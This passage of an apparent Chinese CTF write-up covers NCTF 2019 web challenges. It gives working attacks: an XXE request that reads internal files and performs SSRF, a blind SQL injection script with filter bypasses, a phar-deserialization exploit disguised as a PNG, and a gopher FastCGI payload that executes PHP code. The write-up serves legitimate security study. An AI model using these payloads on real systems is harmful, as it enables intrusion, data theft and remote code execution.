</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><h2 id="_0x02-true-xml-cookbook"><a href="#_0x02-true-xml-cookbook" class="header-anchor">#</a> 0x02 True XML cookbook</h2> <p>相当于第一题的加强版本</p> <p>现在/flag里东西没了</p> <p>看题目描述一开始以为要用上phar之类的骚操作，但是没有其他上传点了</p> <p>fuzz读了一下 /var/www/html/doLogin.php</p> <p>倒是有admin的密码了。。。</p> <p>但是没啥用</p> <p>读了/bin/sh 居然是有的。。。。</p> <p>再读了读/etc/hosts 和/proc/net/arp</p> <p>内网ip泄露</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.18.0.2	3b6bacb4719b
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><div class="language- line-numbers-mode"><pre class="language-text"><code>IP address       HW type     Flags       HW address            Mask     Device
192.168.1.40     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.75     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.55     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.16     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.63     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.249    0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.24     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.39     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.70     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.47     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.8      0x1         0x2         02:42:c0:a8:01:08     *        eth0
192.168.1.244    0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.23     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.50     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.252    0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.31     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.58     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.69     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.7      0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.34     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.77     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.15     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.42     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.49     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.243    0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.18     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.57     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.251    0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.26     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.33     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.64     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.2      0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.41     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.72     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.10     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.52     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.246    0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.17     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.60     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.254    0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.25     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.36     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.71     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.1      0x1         0x2         02:42:ea:57:7a:1c     *        eth0
192.168.1.44     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.9      0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.245    0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.20     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.51     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.253    0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.28     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.59     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.4      0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.35     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.66     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.12     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.43     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.74     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.54     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.19     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.62     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.248    0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.27     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.38     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.65     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.3      0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.46     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.73     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.11     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.53     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.247    0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.22     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.61     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.30     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.37     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.68     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.6      0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.45     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.76     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.14     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.21     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.48     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.242    0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.29     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.56     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.250    0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.5      0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.32     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.67     0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.13     0x1         0x0         00:00:00:00:00:00     *        eth0
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br></div></div><p>SSRF
Burp Suite Introuder 爆破</p> <p>192.168.1.8出了flag.....</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /doLogin.php HTTP/1.1
Host: nctf2019.x1ct34m.com:40003
Content-Length: 220
Accept: application/xml, text/xml, */*; q=0.01
Origin: http://nctf2019.x1ct34m.com:40003
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
DNT: 1
Content-Type: application/xml;charset=UTF-8
Referer: http://nctf2019.x1ct34m.com:40003/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE foo [
 &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://192.168.1.8&quot;&gt;
 ]&gt;

&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><h2 id="_0x03-sqli-赛后复现"><a href="#_0x03-sqli-赛后复现" class="header-anchor">#</a> 0x03 SQLi (赛后复现)</h2> <p>直接给了sql语句</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">''</span> <span class="token operator">and</span> passwd<span class="token operator">=</span><span class="token string">''</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>但是过滤了一堆<code>select . or ' like</code>基本都过滤了</p> <p>然后这里的bypass技巧是</p> <blockquote><p>单引号可以使用<code>\</code>来转义绕过，<code>or</code>可以采用<code>||</code> <code>=</code>可以采用<code>regexp</code>,<code>#</code>可以用``\x00`替代</p></blockquote> <p>然后基本上么得跨表查询，就只能盲注爆破password了</p> <p>exp 核心代码部分</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">def</span> <span class="token function">boolequ</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span>end<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ret<span class="token operator">=</span><span class="token string">&quot;&quot;</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span>end<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> ch <span class="token keyword">in</span> pt<span class="token punctuation">:</span>
            payload<span class="token operator">=</span><span class="token triple-quoted-string string">&quot;&quot;&quot;||passwd/**/REGEXP/**/&quot;^{}&quot;;\x00&quot;&quot;&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ret<span class="token operator">+</span>ch<span class="token punctuation">)</span>
            data <span class="token operator">=</span> <span class="token punctuation">{</span>
                <span class="token string">&quot;username&quot;</span><span class="token punctuation">:</span><span class="token string">'\\'</span><span class="token punctuation">,</span>
                <span class="token string">&quot;passwd&quot;</span><span class="token punctuation">:</span>payload
            <span class="token punctuation">}</span>
            <span class="token comment">#print data</span>
            req<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> req<span class="token punctuation">.</span>status_code<span class="token operator">!=</span><span class="token number">200</span> <span class="token keyword">and</span> req<span class="token punctuation">.</span>status_code<span class="token operator">!=</span><span class="token number">302</span><span class="token punctuation">:</span>
                <span class="token keyword">continue</span> 
            <span class="token keyword">if</span> req<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">302</span><span class="token punctuation">:</span>
                ret<span class="token operator">=</span>ret<span class="token operator">+</span>ch
                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&quot;[-]Result : -&gt; {0} &lt;-\r&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">)</span>
                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+]Result : -&gt;&quot;</span><span class="token operator">+</span>ret<span class="token operator">+</span><span class="token string">&quot;&lt;-&quot;</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><h2 id="_0x04-phar-matches-everything-赛后复现"><a href="#_0x04-phar-matches-everything-赛后复现" class="header-anchor">#</a> 0x04 phar matches everything (赛后复现)</h2> <p>...原题可以拿到源码，但似乎buuoj上不行</p> <p>能拿到的源码是cathmine.php</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Easytest</span><span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">funny_get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">test</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Main</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$url</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$output</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this_is_a_easy_test</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'careful'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this_is_a_easy_test</span><span class="token operator">-&gt;</span><span class="token function">funny_get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>    
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;submit&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$check</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$check</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;File is an image - &quot;</span> <span class="token operator">.</span> <span class="token variable">$check</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;mime&quot;</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;.&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;File is not an image.&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br></div></div><p>这里藏了一个ssrf
但是不能直接用这个php打，因为url不可控</p> <p>判断文件类型使用了getimageinfo，所以可以搞phar的反序列化，这里很明显要我们SSRF，首先读下<code>file:///proc/net/arp</code></p> <p>Exp</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Easytest</span><span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$test</span><span class="token operator">=</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">funny_get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">test</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Main</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$url</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EasyTest</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;\n&quot;</span><span class="token punctuation">;</span>

<span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Main</span><span class="token punctuation">;</span>
<span class="token variable">$payload</span><span class="token operator">-&gt;</span><span class="token property">url</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;file:///proc/net/arp&quot;</span><span class="token punctuation">;</span>

<span class="token variable">$png_header</span> <span class="token operator">=</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'89504e470d0a1a0a0000000d49484452000000400000004000'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'exp.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">-&gt;</span> <span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">-&gt;</span> <span class="token function">setStub</span><span class="token punctuation">(</span><span class="token variable">$png_header</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER();?&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//设置 stub，增加 gif 文件头</span>
<span class="token variable">$phar</span> <span class="token operator">-&gt;</span> <span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.txt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//添加要压缩的文件</span>
<span class="token variable">$phar</span> <span class="token operator">-&gt;</span> <span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//将自定义 meta-data 存入 manifest</span>
<span class="token variable">$phar</span> <span class="token operator">-&gt;</span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">rename</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;exp.phar&quot;</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;exp.png&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br></div></div><p>拿到</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>IP address       HW type     Flags       HW address            Mask     Device
173.236.149.2    0x1         0x2         02:42:ad:ec:95:02     *        eth0
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><code>/etc/host</code>
拿到</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
173.236.149.9	osrc
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>但是都么得回显，后来发现是173.236.149.10这个（估计是buuoj的镜像问题</p> <p>然后访问一下显示</p> <p>这里用evoa师傅的脚本打</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>python gopher.srff.exp.py -c &quot;&lt;?php phpinfo();?&gt;&quot; 173.236.149.10 /var/www/html/index.php
gopher://127.0.0.1:9000/_%01%01%005%00%08%00%00%00%01%00%00%00%00%00%00%01%04%005%01%DB%00%00%0E%02CONTENT_LENGTH18%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%005%00%00%00%00%01%05%005%00%12%00%00%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%01%05%005%00%00%00%00
